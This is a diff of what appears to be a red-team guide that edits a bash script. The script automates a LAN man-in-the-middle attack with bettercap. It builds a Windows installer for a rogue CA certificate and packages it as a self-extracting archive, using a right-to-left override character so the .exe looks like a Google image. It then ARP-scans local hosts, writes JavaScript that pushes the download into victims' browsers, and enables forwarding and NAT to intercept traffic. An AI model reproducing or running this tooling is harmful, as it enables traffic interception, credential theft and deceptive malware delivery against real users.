@@ -45,73 +45,53 @@ sudo nano mitm-bettercap.sh
 #!/bin/bash
 set -euo pipefail
 
-# ========================
-# --- CONFIG & COLORS ---
-# ========================
+# Config & Colors
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
-# ========================
-# --- ROOT CHECK ---
-# ========================
+# Root Check
 [[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
 
-# ========================
-# --- VARIABLES ---
-# ========================
+# Variables
 MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
 BUILD_DIR="$HOME/.wine/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
 RTLO=$'\xE2\x80\xAE'
 DEPS="bettercap arp-scan openssl imagemagick wine winetricks rar apache2 python3 python3-pip"
 
-# ========================
-# --- INSTALL DEPENDENCIES ---
-# ========================
+# Install Dependencies
 color_print CYAN "[*] Checking and installing dependencies..."
 for pkg in $DEPS; do
     dpkg -s "$pkg" &>/dev/null || { color_print YELLOW "[!] Installing $pkg ..."; apt install -y "$pkg"; }
 done
 
-# ========================
-# --- PYINSTALLER ON WINE ---
-# ========================
+# PyInstaller on Wine
 wine pyinstaller --version &>/dev/null || {
     color_print YELLOW "[!] Installing PyInstaller in Wine..."
     wine pip3 install --upgrade pip setuptools wheel
     wine pip3 install pyinstaller
 }
 
-# ========================
-# --- CLEANUP OLD FILES ---
-# ========================
+# Cleanup Old Files
 color_print YELLOW "[*] Cleaning old files..."
 rm -rf "$MITM_DIR" "$BUILD_DIR"
 mkdir -p "$MITM_DIR" "$BUILD_DIR"
 
-# ========================
-# --- NETWORK INFO ---
-# ========================
+# Network Info
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
 LAN=$(hostname -I | awk '{print $1}')
 GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
 
-# ========================
-# --- GENERATE FAKE CERTIFICATE ---
-# ========================
+# Generate Fake Certificate
 color_print CYAN "[*] Generating fake certificate..."
 openssl x509 -in "/root/.bettercap-ca.cert.pem" -outform DER -out "$MITM_DIR/bettercap-ca.cer"
 
-# ========================
-# --- DOWNLOAD & CREATE ICON ---
-# ========================
+# Download & Create Icon
 color_print CYAN "[*] Downloading & creating icon..."
 wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
 convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"
 
-# ========================
-# --- BUILD CERT INSTALLER EXE ---
-# ========================
+# Build cert_installer.exe
 color_print GREEN "[*] Building Windows cert_installer.exe..."
 CERT_B64=$(base64 -w0 "$MITM_DIR/bettercap-ca.cer")
 CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed 's/^/"/;s/$/",/')
@@ -193,9 +173,7 @@ wine pyinstaller --onefile --noconsole \
 
 cp "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"
 
-# ========================
-# --- CREATE SFX ARCHIVE ---
-# ========================
+# Create SFX Archive
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
 Setup=cert_installer.exe
@@ -212,17 +190,13 @@ rar a -sfx -z"$MITM_DIR/sfx.txt" \
     "/var/www/html/google_update${RTLO}gpj.exe" \
     "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico" &>/dev/null
 
-# ========================
-# --- SCAN NETWORK & FORMAT TARGETS ---
-# ========================
+# Scan Network & Format Targets
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
     awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
     grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')
 
-# ========================
-# --- GENERATE CROSS-BROWSER JS ---
-# ========================
+# Generate Cross-Browser JS
 cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
 (function() {
     function injectDownloader() {
@@ -245,9 +219,7 @@ cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
 })();
 EOF
 
-# ========================
-# --- GENERATE SAFE BETTERCAP CAPLET ---
-# ========================
+# Generate Safe Bettercap Caplet
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
 # Recon Targets
 net.probe on
@@ -275,19 +247,16 @@ set events.stream.http.response.dump true
 EOF
 chmod +x "$MITM_DIR/cert_injector.cap"
 
-# ========================
-# --- RESTART APACHE SERVER ---
-# ========================
+# Restart Apache Server
 color_print GREEN "[*] Restarting Apache..."
 service apache2 restart
 
-# ========================
-# --- LAUNCH BETTERCAP ---
-# ========================
+# Launch Bettercap
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -F
 iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
+
 ```
 
 _Run Script_
